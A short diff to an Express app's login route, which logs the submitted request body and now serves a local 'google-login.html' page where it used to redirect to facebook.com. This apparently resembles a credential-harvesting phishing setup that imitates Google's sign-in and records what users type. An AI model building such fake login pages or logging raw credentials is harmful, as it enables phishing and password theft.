@@ -50,7 +50,7 @@ app.post("/signup", async (req, res) => {
 // Login route (we'll improve this later)
 app.post("/login", (req, res) => {
   console.log(req.body);
-  res.redirect("https://www.facebook.com/");
+  res.sendFile(path.join(__dirname, 'frontend', 'google-login.html'));
 });
 
 
